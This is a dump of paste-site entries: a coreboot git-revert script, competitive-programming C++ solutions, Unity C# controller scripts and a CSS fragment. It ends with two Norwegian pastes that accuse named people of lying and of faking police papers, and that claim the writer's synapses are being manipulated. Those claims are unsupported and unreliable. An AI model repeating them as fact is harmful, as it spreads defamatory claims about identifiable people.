id,title,username,language,date,content
        opacity: 1 !important;
        transition: opacity .25s;
    }
    /* Allows links, Chapters, Key Moments, etc to be clicked under ""Show less"" button*/
    ytd-watch-metadata:not([description-collapsed]) #description a,
    ytd-watch-metadata:not([description-collapsed]) #description span,
    ytd-watch-metadata:not([description-collapsed]) #description .yt-formatted-string,
    ytd-watch-metadata:not([description-collapsed]) div[slot=""extra-content""] * {
        position: relative !important;
        z-index: 1 !important;
    }
    /* Move ""Show less"" down while open so it doesn't collide with text. */
    ytd-watch-metadata:not([description-collapsed]) ytd-text-inline-expander {
        min-height: 20px;
        padding-bottom: 20px;
        margin-top: -20px;
        padding-top: 20px;
    }
}"
7F359EJu,corefinal,MrRockchip,Bash,Thursday 27th of July 2023 04:54:08 AM CDT,"#!/bin/sh

#
# GRF = git revert failure
# TLF = toolchain failure
# CBF = coreboot build failure
#

#
# git reset --hard d8f669ef555e60cd0785bd5a56d2fff947cc27d8 #  3707 # - this is a coreboot master at the moment
#

git revert eb2897b113a04229c7749d1c23990c984775ca13 #  3703 # GRF # mb/samsung/lumpy: override SMBus subsystem ID
git revert 6974bcd28e740c61b80fd4c98311fc5ee8c429ea #  3702 # GRF # mb/google/parrot: override SMBus subsystem ID
git revert a6076cfcfdbe46e81e598e4761eb5d4c4a4082ab #  3701 # GRF # mb/google/butterfly: override SMBus subsystem ID
git revert 2e3cb639258fcc63816e3e0f0c5ec468931bf2a4 #  3667 # GRF # acpi.c: Add functions to create GTDT
git revert 92a3b67eaea08b54252a5f18b53ce3e287380365 #  3659 # GRF # acpi/acpi.c: Split of ACPI table generation into separate files
git revert b096d625d53cfc5bf2dbc38310427efa7521001d #  3617 # GRF # soc/intel/xeon_sp: Introduce soc_cpu_is_enabled
git revert 8554954f9cf23d3858f2826ac11c1d026b8faece #  3608 # GRF # nb/intel/i945: Rework nb resource reading
git revert 9ab8a78d7e37c92fb0e59b511dd3ae20f6478002 #  3604 # GRF # soc/amd/common/acpimmio: factor out IO port access to PM registers
git revert 5bd68097cbb850552d6ec440118c409612e034f4 #  3597 # CBF # soc/amd/common/acpimmio/mmio_util: drop enable_acpimmio_decode_pm24
git revert ebafd4b905d913c37274ce97ff21c8f26ffabd78 #  3572 # GRF # util/crossgcc: Update GCC version from 11.3 to 11.4
git revert ca0436f7c134e565cb83878efe4d4d4a9ef160f4 #  3514 # GRF # nb/intel/x4x: Rework nb resource reading
git revert 90753398b6e394efedae423004648d5f7c303fd4 #  3510 # GRF # util/crossgcc: Fix broken link by Intel to acpica tarball
git revert a959f0ad7620e2e8b13b51c34f7397caf53e9a5f #  3491 # GRF # allocator_v4: Disable top-down allocation for EDK2
git revert 0bcdd40d789236aff2c205511dfc962a76a7c3be #  3477 # GRF # acpi/acpi.c: Fix regression with DSDT
git revert adb80075151f5bb79b591cfafc54f4196fa7d353 #  3440 # GRF # acpi/acpi.c: Move ACPI header creation to a function
git revert 01af0f8ac80384d23abc99860f2c5d605a1aa540 #  3439 # GRF # acpi/acpi.c: Reduce boilerplate
git revert afa5383fdced8829689894a1833162b7361d9224 #  3402 # GRF # crossgcc: Upgrade IASL from 20230331 to 20230628
git revert 0754e00ace632c4a9e22670da3d676d6e9352aa2 #  3339 # GRF # allocator_v4: Fix top-level allocations w/o IORESOURCE_ABOVE_4G
git revert 866eff06edb962633723295b36b89a80befb757d #  3332 # GRF # allocator_v4: Manually inline some thin functions
git revert ee57065daddf0ae42851472e40da0b812c95a397 #  3331 # GRF # allocator_v4: Factor resource printing out
git revert 9260ea60bfa487851e6afda59d83214a0c967208 #  3330 # GRF # allocator_v4: Use memranges only for toplevel
git revert 5226301765ded70e0ef640e5252bbaca8cd14451 #  3329 # GRF # allocator_v4: Treat above 4G resources more natively
git revert f9ee87ffbf6e7e5d7870bd3617c5a3368ac41c54 #  3252 # GRF # acpi/acpi.h: Remove global acpi_fill_ivrs_ioapic()
git revert 9362dd75d805fea8bc95ff58d5abd42cbbb4c36a #  3226 # GRF # acpi/acpi.c: Reduce scope of functions used locally
git revert 8cab80c84f2be22e1f45a2b31c8019695b70abb2 #  3158 # GRF # soc/amd/common/acpi: move acpi_fill_root_complex_tom to Stoneyridge
git revert 1c3849d5dc327866fc5f9e8805022b0f37d930a4 #  3124 # GRF # Documentation: Move 4.20 release notes to 4.20.1
git revert 9c599c8b30eca53292cc9af6b01718ac8de46807 #  2994 # GRF # crossgcc: Upgrade IASL from 20221020 to 20230331
git revert 67d95185865651aecb7ef3d8d343ec3cb9e60f77 #  2991 # CBF # arch/x86: Don't allow hw floating point operations
git revert 531023285ea4108d5b847625739d76992ce39200 #  2927 # GRF # soc/intel/quark: Drop support
git revert 6a07db21b12b08c7b975921f2ee1196dd0ec92b3 #  2904 # CBF # console: Add format-checking __printf() to die()
git revert a4298bc3f82f476ce82e3e948f6573f5e38dfb25 #  2823 # GRF # mb/prodrive/atlas: Shorten FSP-M UPD statements
git revert 85556ac1dc9472a7624cdc3c82aa890407ecceda #  2794 # GRF # soc/intel: Clean up some includes
git revert 83faa5d804d183a26b0fa66b5d55bbe5f3b72c89 #  2785 # GRF # mb/google,intel: Use common ChromeEC code for lid shutdown
git revert b78e4620375cc5668db668d900340fd89271c330 #  2743 # GRF # Convert literal uses of CONFIG_MAINBOARD_{VENDOR,PART_NUMBER}
git revert 5fc0afbc170960d05012eec9b3b8717f65a07478 #  2684 # GRF # asus/p2b, emu/qemu-i440fx: Use acpigen_write_processor_device()
git revert 02a19010916f6de42cd5ce0ba74da8ba5ad5c8ec #  2680 # GRF # sb,soc/amd,intel: Drop include <cpu/x86/smm.h>
git revert 240baa31e8a804029069e21f523556d8628f6001 #  2679 # GRF # ACPI: Make FADT entries for RTC/CMOS architectural
git revert 121d3d57adc35ed34204f983a72590f978939b1c #  2652 # GRF # ACPI: Make FADT entries for SMI architectural
git revert 7186e28001ff01e9f48f838eab8ee462c3e8155c #  2651 # GRF # soc/amd: Drop acpi_fill_madt_irqoverride()
git revert 3454367d6401ba7d468e8915706fd022b3b5d59f #  2628 # GRF # AMD binaryPI: Use ACPI_COMMON_MADT_IOAPIC
git revert 8eac12fa7d49de59f63739bcb466e188dbc1ed66 #  2627 # GRF # soc/intel/common: Use ACPI_COMMON_MADT_IOAPIC
git revert 304f8387fe698b66c7c853098001fc83638dd874 #  2626 # GRF # soc/amd: Use ACPI_COMMON_MADT_IOAPIC
git revert 1f9e24052a9d51c015d2841ee66e7408d7bdab84 #  2625 # GRF # asus/p2b, emulation/qemu-i440fx: Use ACPI_COMMON_MADT_IOAPIC
git revert ac61a65fef73fe0700695afd1fc849ed629d59aa #  2624 # GRF # aopen/dxplplusu: Use ACPI_COMMON_MADT_IOAPIC
git revert 6437409b760a927a34bf5e804703873af898e14f #  2623 # GRF # soc/intel/baytrail,braswell: Use COMMON_MADT_IOAPIC
git revert 81dc352032cacb309ed9335f394969d847820511 #  2622 # GRF # intel/bd82x6x,broadwell,lynxpoint: Use ACPI_COMMON_MADT_IOAPIC
git revert 7f8e2a6a4a9cb1544ef8fa19850abeb3d4213931 #  2621 # GRF # sb/intel: Use ACPI_COMMON_MADT_IOAPIC
git revert 10bdee13272a77aed46912363db691cf4c088a93 #  2620 # GRF # ACPI: Add COMMON_ACPI_MADT_IOAPIC and CUSTOM_ACPI_MADT
git revert e742b68f1ac9324ce1f700323f1226e86d068a8c #  2619 # GRF # arch/x86/ioapic: Promote ioapic_get_sci_pin()
git revert ae1b2d49cf0ad09ff8f1e3904a9e7b23d6fb423b #  2618 # GRF # soc/intel: Introduce ioapic_get_sci_pin()
git revert 9368cf90255daeb53765d442a639f86ee5be1f29 #  2615 # GRF # acpi/acpi.c: Reduce scope of some functions
git revert 27af3e6b111f462a71762bd56363d06d73505284 #  2599 # GRF # include/cpu/amd/mtrr: fix typo in get_top_of_mem_above_4gb
git revert 7c302cf20859592a32e19fb6eb434dfb06b1d3c3 #  2583 # GRF # cpu/amd/pi/00730F01: rename fixme.c to cpu_io_init.c
git revert fb532c711e2ef317108d6ffc35ae751bf7d58530 #  2545 # GRF # include/cpu/amd/mtrr: return uint32_t from get_top_of_mem_below_4gb
git revert 5e9afe7272d110265ffa6f5465fa942c2bf4961f #  2544 # CBF # include/cpu/amd/mtrr: rename functions to get top of memory regions
git revert 71fd3becf0f6aafa1b17495233129b06893402b1 #  2492 # GRF # soc/intel/baytrail: Make acpi_madt_irq_overrides() static
git revert 69a13964ea6c5fda6ddf475a9ea905aa7376620c #  2491 # GRF # sb,soc/amd,intel: Add and use ACPI_COMMON_MADT_LAPIC
git revert 36e6f9bc047f86e1628c8c41d3ac16d80fb344de #  2480 # GRF # soc/intel/xeon_sp: Don't sort struct device cpus for numa
git revert 8547429d396a68fc82cc6aff5b7fa61ae8235834 #  2474 # GRF # acpi/acpi.c: Follow spec more closely for MADT
git revert f4dff389ee90640cd2f9cd4b34f59ce14a738379 #  2456 # GRF # cpu/x86/mp_init.c: Set topology on BSP
git revert 2e9f0d3b6aa754dc71cd36086d1eb2a839bdb7bd #  2419 # GRF # ACPI: Add helper for MADT LAPICs
git revert 9ac1fb729fa316564992403580254b1c4afbf9c2 #  2418 # CBF # ACPI: Add helper for MADT LAPIC NMIs
git revert 899c713e3eb073491d8b954165919daa87609493 #  2417 # CBF # binaryPI: Use common code for LAPIC NMIs
git revert e84b095d3a238ae5fd734c4c186132a4e07eea07 #  2409 # GRF # util/sconfig: Remove unused ioapic and irq keywords
git revert 8b8400a889abadbbd2156d4a35a27203068766f1 #  2408 # GRF # drivers/fsp2_0/mp_service_ppi: Use struct device to fill in buffer
git revert 177e13513644b4d3de2529468e827ebfcadbda02 #  2360 # CBF # cpu/x86/topology: Add code to fill in topology on struct path
git revert ddf48eb7c75687398d6a390bc21a50d74aef5df6 #  2359 # GRF # cpu/mp_init.c: Only enable CPUs once they execute code
git revert a804f9195eb8fd93a2a6650cc24a26e422696214 #  2358 # GRF # cpu/smm_module_loader.c: Fix up CPU index locally
git revert 21ca7753bf619f1de8dca79fd1113a9c22335f11 #  2356 # GRF # cpu/x86/mp_init.c: Keep track of initial lapic ID inside device_path
git revert 0686c69802867293644a924bc29812697eace76f #  2300 # GRF # util/crossgcc: Update binutils from 2.37 to 2.40
git revert 586b1c8da06fe34f91c747440730b31428248b34 #  2181 # GRF # mb/prodrive/atlas: Add workaround for CLKREQ pins
git revert 4f13239318a92451dddcc821d9fb977c1d0b6994 #  2138 # GRF # mb/prodrive/atlas: Configure PCIe CLKREQ
git revert 13dcdff7c7e1877887c3eb696b8de35872937d41 #  2127 # GRF # mb/asrock/b75pro3-m: Disable unused ME KT PCI device
git revert ac8c378777d861000d82eea1c7439f16dcd45797 #  1940 # GRF # cpu/x86/smm: Add PCI resource store functionality
git revert 829e8e65b93963d15367092cd3d364c230465720 #  1809 # GRF # ##### soc/intel: Use common codeflow for MP init
git revert 36847977cb95e319ec67ab2edf85e6ea96783628 #  1760 # GRF # ##### util/crossgcc: Update GCC from 11.2 to 11.3
git revert c013fa6234f08e22dd3706849936847cf82b5024 #  1748 # GRF # mb/scaleway/tagada: Drop support
git revert 107e7aa0f58f79ee5719f82c7147e53d7d9fa218 #  1723 # GRF # cpu/x86/smm: Enable setting SMM console log level from mainboard
git revert 893c3ae892961facc9be8bd300160222e694ab34 #  1543 # GRF # tree: Drop repeated words
git revert 584d5e1cbabc1a8ce679597263d22a2a9b87c9f7 #  1532 # GRF # soc/intel/apl: Hook up cpu ops in devicetree
git revert 01c8c5936451d1f31dcb0a1c79f1f8e01dead83b #  1527 # GRF # Makefile.inc: Use 'Wmissing-include-dirs' command option
git revert b5df65a9aaee50421913ace6d7a4b35e0ddff676 #  1501 # GRF # mb/*: Replace SNB PCI devices with references from chipset.cb
git revert 64e2ecb36fd1d7b289cd9671dcfae2e335528d81 #  1493 # GRF # soc/intel/apl: Move cpu cluster to chipset.cb
git revert 15d5183e4af79624304a8379b71767cd8ee09250 #  1433 # CBF # util/sconfig: Remove lapic devices from devicetree parsers
git revert 2c1511a461cd6dde750090e0337bf3f893710dc1 #  1430 # GRF # crossgcc: Upgrade mpfr from 4.1.1 to 4.2.0
git revert d15a9f9b342e5226be67b6d43e68389d871f7f84 #  1429 # GRF # crossgcc: Upgrade mpc from 1.2.1 to 1.3.1
git revert 6ac0a46bbf9e20c8412ee0d04658b3a2b10d0734 #  1422 # GRF # util/crossgcc/buildgcc: Remove extra ""/"" at the end of IASL_BASE_URL
git revert 69cd729c0cde6f15d1de692f5a2da5d3dfe8ba15 #  1421 # GRF # mb/*: Remove lapic from devicetree
git revert 48fa6dd8f9a8f78f94d508b0a105e2ddaacf99ba #  1326 # CBF # arch/x86/Kconfig: Remove unused NUM_IPI_STARTS
git revert c9cd886a4b2d52734c6d1f5d028b98f0f3b1bcce #  1178 # CBF # treewide: Remove unused <cpu/x86/smm.h>
git revert 8b93a173fbed29ea356653caa0626e48e81a5f8d #  1177 # CBF # treewide: Remove unused <cpu/amd/mtrr.h>
git revert 16a444c5011e70298ebd9546a39f9d8b61d95030 #  1155 # GRF # util/crossgcc/Makefile.inc: Terminate quoted string
git revert fc84ae7aa3cf7e8000ef69f854281f4648eeb2b8 #  1124 # CBF # treewide: Remove unused <cpu/amd/msr.h>
git revert 4d75dbd1c1d6362c002a26a5c4e6de74b2816cdf #   950 # GRF # cpu/x86: Set up a separate stack for APs
git revert 3b32af950d704b1d14ddca917dd480f5ebbf09a5 #   821 # GRF # util/crossgcc: Add option to get packages from coreboot's mirror
git revert db65dd60fb11e3d38dbdd9a2e2f64d6ea7ef7576 #   748 # GRF # cpu/x86/mp_init.c: Improve AP entry point
git revert 6e23da2983f83c803cf4abfee542d7f90e8e9eb5 #   622 # CBF # cpu/cpu.h: Change the function signature
git revert f1e78a1349d40f2e8a74b15471fc5560976a566f #   560 # GRF # arch/x86/ioapic.c: Move macros to compilation unit
git revert 2c3ebd8b9d56c01d8e4adadf6f4e4d5b56cdb4e1 #   555 # GRF # mb,sb,soc/intel: Drop useless IO trap handlers
git revert 2393ad0bfb1cd23a0524e7b02a0fd75aff3bf274 #   520 # CBF # Makefile.inc: Use 'Wold-style-definition'
git revert f9679c42876bab145f1b7a2a2e6e1eb5331fa418 #   500 # GRF # nb/intel/gm45: Remove apic 0 from devicetree
git revert 31ba9356b877d670e683953f8b8962a7e6206cc3 #   499 # GRF # nb/intel/i945: Remove apic 0 from devicetree
git revert 803029685f96bccac13359fc616d1577508ba764 #   498 # GRF # nb/intel/x4x: Remove apic 0 from devicetree
git revert 98c92570d9bb363740ae1b2cbbefc3c0f2404cb4 #   497 # CBF # cpu/intel/speedstep: Have nb and sb code provide c5/c6/slfm
git revert 60a422736bde766489db8ff0dc2d56ab333c37cc #   407 # GRF # util/crossgcc: Use GitHub for downloading IASL
git revert cc22607dbfbab0c9ce42c071b5b3c4a304845313 #   420 # GRF # Revert ""src/arch/x86: Use core apic id to get cpu_index()""
git revert a45ed44724a30303030e80898202b77c34498942 #   373 # CBF # crossgcc: Upgrade IASL from 20220331 to 20221020
git revert fa775b7651e4488f0535c17a5e04974e7d1a40b2 #   171 # CBF # cpu/cpu.h: Remove unused functions prototypes
git revert 987f46c276bd1b6b5d15be8ca9aee5f028e37fa7 #   167 # GRF # arch/x86/mpspec.c: Drop weak write_smp_table()
git revert ca5a793ec31c76b168ae2f9d2260b49c79330eb2 #   166 # CBF # drivers/generic/ioapic: Drop poor implementation
git revert d4dfc21f70616bc97191969aa2b6d0196a525fce #   134 # GRF # cpu/x86: Set thread local storage in C code
git revert 1d3c2e65724ed92eeef723c1acdc86ba91cbd682 #   111 # CBF # arch/x86/ioapic: Reduce API exposure
git revert c8a20b9d3b8939e4b7d259c5857631c9690657de #    76 # CBF # cpu/*: Drop PARALLEL_MP leftovers
git revert 36695f278f0ca3cb3a3b0a8ca50b317505882df2 #    18 # CBF # device/resource_allocator_v3: Drop code
git revert f4c11dcb53bbd324741ecd7109584eaa55579f7f #    17 # CBF # cpu/x86: Drop !CPU_INFO_V2 code
git revert 66b2888b77da6721955a918c8cd5399abe786a6a #    16 # CBF # cpu/x86: Drop LEGACY_SMP_INIT
git revert e2d291b5ae4aa49d5b1613e06b86bf2fc8efe4c5 #    15 # CBF # mb/qemu/x86: Remove option for LEGACY_SMP_INIT
git revert 03a6ccd20d9bb54e3a009269b8e454ee8a2e3051 #    14 # CBF # sb/amd: Remove dropped platforms
git revert 1a010236cf922fc28cfb36b604bdf17a9ea3cb82 #    13 # CBF # nb/amd/agesa: Remove leftover code
git revert 81a4fefce223ba358310aec2d988484202c176e2 #    12 # CBF # cpu/amd/agesa: Remove leftover code
git revert 0f12381083fdfc7bb3e6f3b2ac5cd6247506c543 #    11 # CBF # vendorcode/amd/agesa: Drop unused common code
git revert 7036ded25d3a051902862e2a7bdfe15916f0951d #    10 # CBF # vendorcode/amd/agesa/family16: Drop unused platform
git revert 49af4f7f9197e559b2c7142129441679bb1d24a2 #     9 # CBF # {cpu/nb}/amd/family16: Remove platform
git revert 5d152122284880029c123fe2b7dfa20cd8b74632 #     8 # CBF # vendorcode/amd/agesa/fam15tn: Drop unused platform
git revert 9a458e4e58edbfc154dce007961514b5c31cf7aa #     7 # CBF # {cpu/nb}/amd/family15tn: Remove platform
git revert 713e3c087b6128fec2fd17d4373357e10fc928ab #     6 # CBF # vendorcode/amd/agesa/fam14: Remove dropped platform
git revert dbdf170dcdf9edbc860766606e53c6d647d89d38 #     5 # CBF # {cpu/nb}/amd/family14: Remove platform
git revert 6baee3d28729d4b924e8f793c4c7311cebf1f80a #     3 # CBF # mb/*/*: Remove AMD agesa family16 boards
git revert f9decbb0c720662d8e71fe221aef55b7ecf76196 #     2 # CBF # mb/*/*: Remove AMD family14 boards
git revert e56f0c7cab77b89a750b4a3f7f380b1a10cd0d1d #     1 # CBF # mb/*/*: Remove AMD FAMILY15TN boards

#
# git reset --hard 5e8e911b7caee021faff96c4e82a77a42544ea62 # 00000 # - zero commit number = zero point of history before removal
#

git revert ce134ababd6a444082962ccdfcd34415a647f41e # -4568 # GRF # crossgcc/buildgcc: Remove unused GCC_AUTOCONF_VERSION
git revert b0d87f753c9c517ba906115362d32aa4422fd188 # -5952 # TLF # util/crossgcc: Update gcc to 11.2

#
# ERRATA of 1000 ( git reset --hard bd91aa760945cf6229e4ce5e0acc5ed7cd60b398 ) : after doing the <1000 reverts, also add
#     #define SPEEDSTEP_APIC_MAGIC 0xACAC
# to the beginning of ./coreboot/src/cpu/x86/lapic/lapic_cpu_init.c
# to avoid doing the
#     git revert f9679c42876bab145f1b7a2a2e6e1eb5331fa418 #   500 # nb/intel/gm45: Remove apic 0 from devicetree
#     git revert 31ba9356b877d670e683953f8b8962a7e6206cc3 #   499 # nb/intel/i945: Remove apic 0 from devicetree
#     git revert 803029685f96bccac13359fc616d1577508ba764 #   498 # nb/intel/x4x: Remove apic 0 from devicetree
#     git revert 98c92570d9bb363740ae1b2cbbefc3c0f2404cb4 #   497 # cpu/intel/speedstep: Have nb and sb code provide c5/c6/slfm
#"
t73x4P5c,H,Salvens,C++,Thursday 27th of July 2023 04:45:46 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <map>
#include <queue>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n;
    cin >> n;
    map<string, vector<string>> mp;
    for (int i = 0; i < n; ++i) {
        string name1, rep, name2;
        cin >> name1 >> rep >> name2;
        for (auto& elem: name1) {
            elem = tolower(elem);
        }
        for (auto& elem: name2) {
            elem = tolower(elem);
        }
        mp[name2].emplace_back(name1);
    }

    map<string, int> d;
    queue<string> q;
    string root = ""polycarp"";
    q.push(root);
    d[root] = 1;
    int ans = 0;
    while (!q.empty()) {
        string name = q.front();
        q.pop();
        for (const auto& to: mp[name]) {
            if (d[to] == 0) {
                d[to] = d[name] + 1;
                q.push(to);
                ans = max(ans, d[to]);
            }
        }
    }
    cout << ans << '\n';
}"
TyYEnzrY,Untitled,Derga,C++,Thursday 27th of July 2023 04:39:32 AM CDT,"https://codeforces.com/contest/1851/problem/D


#include<bits/stdc++.h>
using namespace std;
#define ll long long
int main()
{
	ll i,j,k,t,n,a[200005];
	
	cin>>t;
	while(t--)
	{
		cin>>n;set<ll> b;
		ll s=(1+n)*n/2;
		ll x,l=0;
		for(i=1;i<n;i++)
		{
			cin>>x;
			if(x-l<=n)
				b.insert(x-l);
			l=x;
		}
		if(b.size()==n-2+(x!=s))
			cout<<""YES""<<endl;
		else
			cout<<""NO""<<endl;
	}
	return 0;
}




#include <bits/stdc++.h>
using namespace std;
 
using ll = long long;
 
int main()
{
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    int tests;
    cin >> tests;
    while (tests--) {
        ll n;
        cin >> n;
        --n;
        vector<ll> a(n);
        for (ll &i: a) {
            cin >> i;
        }
        vector<ll> numbers(1, a[0]);
        for (int i{1}; i < n; ++i) {
            numbers.push_back(a[i] - a[i - 1]);
        }
        ++n;
        vector<bool> occurred(1 + n, false);
        vector<ll> unexpected_numbers;
        for (auto i: numbers) {
            if (1 <= i && i <= n) {
                if (occurred[i]) {
                    unexpected_numbers.push_back(i);
                } else {
                    occurred[i] = true;
                }
            } else {
                unexpected_numbers.push_back(i);
            }
        }
        vector<ll> missing_numbers;
        for (int i{1}; i <= n; ++i) {
            if (!occurred[i]) {
                missing_numbers.push_back(i);
            }
        }
        if (missing_numbers.size() == 1u) {
            ll sum = n * (n + 1) / 2;
            if (a.back() < sum && missing_numbers[0] == sum - a.back()) {
                cout << ""YES\n"";
            } else {
                cout << ""NO\n"";
            }
            continue;
        }
        if (
            unexpected_numbers.size() == 1u
            && missing_numbers.size() == 2u
            && unexpected_numbers[0] == missing_numbers[0] + missing_numbers[1]
        ) {
            cout << ""YES\n"";
        } else {
            cout << ""NO\n"";
        }
    }
    return 0;
}"
e3YecM1Q,PlayerController27,noobHasan,C#,Thursday 27th of July 2023 04:31:49 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using DG.Tweening;
public class PlayerController : MonoBehaviour {

    public static PlayerController Instance;
    private Rigidbody rb;
    private Transform playerTransform;
    [SerializeField]
    private Transform heliRotor;

    [SerializeField]
    private float Speed = 40f;
    private float RotationSpeed = 10f;
    private float visualRotationSpeed = 10f;
    private float yAxisValue = 0;
    private float SpeedYaw = 1; // rotation Y
    private Quaternion mainRot = Quaternion.identity;

    private float maxVisualRotationZ = 30f; // Maximum Z-axis rotation for the visual.
    private float currentVisualRotationZ = 0f; // Current Z-axis rotation of the visual.

    private bool isSwiping = false;
    private Tweener speedTween;


    private void Awake()
    {
        Instance = this;
        rb = GetComponent<Rigidbody>();
        playerTransform = transform.GetChild(0);
    }
    private void Start()
    {
        mainRot = this.transform.rotation;
        heliRotor.DOLocalRotate(new Vector3(0, 0, 180), .1f, RotateMode.WorldAxisAdd).SetLoops(-1, LoopType.Incremental);
    }

    private void FixedUpdate()
    {
        Vector3 velocityTarget = Vector3.zero;

        Quaternion AddRot = Quaternion.identity;
        yAxisValue = Mathf.Clamp(yAxisValue, -2f, 2f);

        AddRot.eulerAngles = new Vector3(0, yAxisValue, 0);
        mainRot *= AddRot;

        rb.rotation = Quaternion.Lerp(rb.rotation, mainRot, Time.deltaTime * RotationSpeed);
        velocityTarget = (rb.rotation * Vector3.forward) * Speed;

        rb.velocity = velocityTarget;

        if (isSwiping)
        {
            yAxisValue = Mathf.Lerp(yAxisValue, 0, Time.deltaTime);
        }
        else
        {
            yAxisValue = Mathf.Lerp(yAxisValue, 0, Time.deltaTime * 5f);
        }
        float targetVisualRotationZ = yAxisValue * maxVisualRotationZ;
        currentVisualRotationZ = Mathf.Lerp(currentVisualRotationZ, targetVisualRotationZ, Time.deltaTime * visualRotationSpeed);
        playerTransform.localEulerAngles = new Vector3(playerTransform.localEulerAngles.x, playerTransform.localEulerAngles.y, -currentVisualRotationZ);

    }
    public void TurnControl(float turn)
    {
        if (speedTween != null && speedTween.IsActive())
        {
            speedTween.Kill();
        }
        speedTween = DOTween.To(() => Speed, x => Speed = x, 10, 1f);
        yAxisValue += turn * Time.deltaTime * SpeedYaw;
        isSwiping = true;
    }
    public void EndTurnControl()
    {
        if (speedTween != null && speedTween.IsActive())
        {
            speedTween.Kill();
        }
        Speed = 20f;
        isSwiping = false;
    }

    
}
"
05HdBgrT,TouchController27,noobHasan,C#,Thursday 27th of July 2023 04:31:29 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class TouchController : MonoBehaviour
{
    private Vector2 tapPoint, swipeDelta = new Vector2(0, 0);
    private bool isDragging, isMobilePlatform;
    private float rotationMultipliar = 100f;

    private void Awake()
    {
#if UNITY_EDITOR || UNITY_STANDALONE
        isMobilePlatform = false;
#else
        isMobilePlatform = true;
#endif

        Application.targetFrameRate = 60;

    }

    void Update()
    {
        SwipeReader(false);
    }

    private void SwipeReader(bool isRestart)
    {
        if (!isMobilePlatform)
        {
            if (Input.GetMouseButtonDown(0))
            {
                isDragging = true;
                tapPoint = Input.mousePosition;
            }
            else if (Input.GetMouseButtonUp(0))
            {
                ResetSwipe();
                PlayerController.Instance.EndTurnControl();

            };
        }
        else
        {
            if (Input.touchCount > 0)
            {
                if (Input.touches[0].phase == TouchPhase.Began)
                {
                    isDragging = true;
                    tapPoint = Input.touches[0].position;
                }
                else if (Input.touches[0].phase == TouchPhase.Canceled ||
                         Input.touches[0].phase == TouchPhase.Ended)
                {
                    ResetSwipe();
                    PlayerController.Instance.EndTurnControl();
                };
            }
        }

        CalculateSwipe();
    }

    private void CalculateSwipe()
    {
        swipeDelta = Vector2.zero;

        if (isDragging)
        {
            if (!isMobilePlatform && Input.GetMouseButton(0)) swipeDelta = (Vector2)Input.mousePosition - tapPoint;
            else if (Input.touchCount > 0) swipeDelta = Input.touches[0].position - tapPoint;

            float rotationRatio = swipeDelta.x / Screen.width; 
            float finalRotation = rotationRatio * rotationMultipliar;
            PlayerController.Instance.TurnControl(finalRotation);
        }
    }


    public void ResetSwipe()
    {
        isDragging = false;
        tapPoint = swipeDelta - Vector2.zero;
    }
}
"
jFqGX5fe,G,Salvens,C++,Thursday 27th of July 2023 04:28:51 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <map>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n;
    cin >> n;
    map<string, string> start, tmp;
    for (int i = 0; i < n; ++i) {
        string old, nw;
        cin >> old >> nw;
        if (!tmp.contains(old)) {
            start[old] = nw;
            tmp[nw] = old;
        } else {
            string cur = tmp[old];
            start[cur] = nw;
            tmp[nw] = cur;
        }
    }
    cout << start.size() << '\n';
    for (auto& [x, y]: start) {
        cout << x << ' ' << y << '\n';
    }
}"
z0Kt5eaY,Sigvald,rabbnix,C++,Thursday 27th of July 2023 04:19:47 AM CDT,"Tommy magnussen har jugd for hele simondarres vei.
Aka advokat sigvald "
Mrcre5LB,Darpa fake mot kåre,rabbnix,C++,Thursday 27th of July 2023 04:17:56 AM CDT,"Borettslaget har en politiprinter hvor de skriver ut falske papier mot kåre bull.

Nå må dere slutte å høre på alt mølet dere hører på.

Folk manipulerer synapsene mine... 
Dere hører på falske tanker, falsk tale, falske minner"
